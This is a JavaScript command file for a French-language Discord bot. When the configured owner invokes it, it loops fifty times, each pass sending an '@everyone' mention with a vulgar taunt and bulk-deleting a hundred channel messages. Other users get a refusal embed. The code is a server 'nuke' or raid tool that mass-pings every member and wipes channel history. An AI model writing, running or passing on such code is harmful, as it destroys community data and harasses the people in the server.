
exports.run = (client, message, args) => {

  if (message.author.bot) return;
  if (message.channel.type != 'text') return message.channel.sendMessage({ embed: { color: 1082119, author: { name: client.user.username, icon_url: client.user.avatarURL }, title: `**ERROR 404**`, description: "N'utulisez que les ERROR dans des serveurs !", timestamp: new Date(), footer: { icon_url: client.user.avatarURL, text: `©${client.user.tag}` } } });
  const config = require("../config.json");

  if (message.author.id == config.owner_id) {

    for (var i = 0; i < 50; i++) {
      message.channel.send("@everyone, Le cimetière vous a bien enculé !");
      message.channel.bulkDelete(100);
    }

  } else {
    message.channel.send({
      embed: {
        color: 3447003,
        author: {
          name: client.user.username,
          icon_url: client.user.avatarURL
        },
        title: `**Commande**`,
        description: "_Cette commande est disponible seulement pour l'owner._",

        timestamp: new Date(),
        footer: {
          icon_url: client.user.avatarURL,
          text: `©ToniPortal#8330`
        }
      }
    })
  }

}